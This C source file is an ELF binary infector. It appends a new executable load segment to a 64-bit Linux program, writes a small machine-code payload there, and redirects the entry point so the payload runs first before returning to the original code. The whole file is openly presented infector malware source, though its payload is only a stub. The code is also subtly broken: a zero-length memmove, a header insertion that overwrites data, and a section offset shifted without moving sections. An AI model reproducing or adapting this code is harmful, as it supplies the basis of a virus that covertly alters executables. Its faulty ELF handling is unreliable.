#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>

unsigned char payload[] = {
    0x50,
    0x48, 0xb8,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x44, 0x24, 0x08,
    0x58,
    0xc3
};

void print_usage(const char *program_name) {
    printf("Usage: %s <input_file> <output_file>\n", program_name);
    exit(1);
}

int infect_elf(const char *input_file, const char *output_file) {
    int fd;
    struct stat st;
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    void *map;
    size_t payload_size = sizeof(payload);

    fd = open(input_file, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return -1;
    }

    if (fstat(fd, &st) < 0) {
        perror("fstat");
        close(fd);
        return -1;
    }

    map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return -1;
    }
    close(fd);

    ehdr = (Elf64_Ehdr *)map;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Not a valid ELF file\n");
        munmap(map, st.st_size);
        return -1;
    }

    phdr = (Elf64_Phdr *)(map + ehdr->e_phoff);
    
    Elf64_Phdr *last_load = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            last_load = &phdr[i];
        }
    }
    
    if (!last_load) {
        fprintf(stderr, "No PT_LOAD segment found\n");
        munmap(map, st.st_size);
        return -1;
    }

    uint64_t page_size = 0x1000;
    uint64_t new_vaddr = (last_load->p_vaddr + last_load->p_memsz + page_size - 1) & ~(page_size - 1);
    uint64_t file_offset = (st.st_size + page_size - 1) & ~(page_size - 1);

    int out_fd = open(output_file, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (out_fd < 0) {
        perror("open");
        munmap(map, st.st_size);
        return -1;
    }

    if (ftruncate(out_fd, file_offset + payload_size) < 0) {
        perror("ftruncate");
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }

    Elf64_Phdr new_phdr;
    memset(&new_phdr, 0, sizeof(new_phdr));
    new_phdr.p_type = PT_LOAD;
    new_phdr.p_flags = PF_X | PF_R;
    new_phdr.p_offset = file_offset;
    new_phdr.p_vaddr = new_vaddr;
    new_phdr.p_paddr = new_vaddr;
    new_phdr.p_filesz = payload_size;
    new_phdr.p_memsz = payload_size;
    new_phdr.p_align = page_size;

    uint64_t original_entry = ehdr->e_entry;
    *(uint64_t*)(&payload[3]) = original_entry;

    ehdr->e_shoff += page_size;
    ehdr->e_entry = new_vaddr;

    memmove(&phdr[ehdr->e_phnum + 1], &phdr[ehdr->e_phnum], 
            (ehdr->e_phoff + ehdr->e_phentsize * ehdr->e_phnum) - 
            (ehdr->e_phoff + ehdr->e_phentsize * ehdr->e_phnum));
    
    memcpy(&phdr[ehdr->e_phnum], &new_phdr, sizeof(Elf64_Phdr));
    ehdr->e_phnum++;

    if (write(out_fd, map, st.st_size) != st.st_size) {
        perror("write");
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }

    size_t padding_size = file_offset - st.st_size;
    char *padding = calloc(1, padding_size);
    if (write(out_fd, padding, padding_size) != padding_size) {
        perror("write padding");
        free(padding);
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }
    free(padding);

    if (write(out_fd, payload, payload_size) != payload_size) {
        perror("write payload");
        close(out_fd);
        munmap(map, st.st_size);
        return -1;
    }

    close(out_fd);
    munmap(map, st.st_size);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        print_usage(argv[0]);
    }

    if (infect_elf(argv[1], argv[2]) != 0) {
        fprintf(stderr, "Failed to infect file\n");
        return 1;
    }

    return 0;
}